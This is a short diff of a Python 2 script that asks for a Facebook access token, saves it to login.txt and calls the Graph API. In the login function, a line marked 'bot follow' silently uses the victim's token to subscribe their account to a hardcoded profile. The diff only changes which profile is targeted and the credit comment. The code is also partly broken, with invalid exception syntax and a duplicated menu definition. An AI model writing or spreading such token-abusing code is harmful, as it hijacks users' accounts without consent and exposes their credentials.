@@ -76,14 +76,14 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError, IOError:
-		    token = raw_input("\033[1;93m➤\033[1;97m [?] Enter Token : ")
-	if token == "":
+		token = raw_input("\033[1;93m➤\033[1;97m Enter Token : ")
+		if token == "":
 			print("Wrong Input")
 		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/princess.lubisi.7/subscribers?access_token="+token)      #FUEGO X RAJUL
+			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # Dapunta Khurayra X
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
@@ -91,9 +91,6 @@ def login():
 
 def menu():
 	os.system("clear")
-
-def menu():
-    os.system("clear")
 	global token
 	try:
 		token = open("login.txt","r").read()
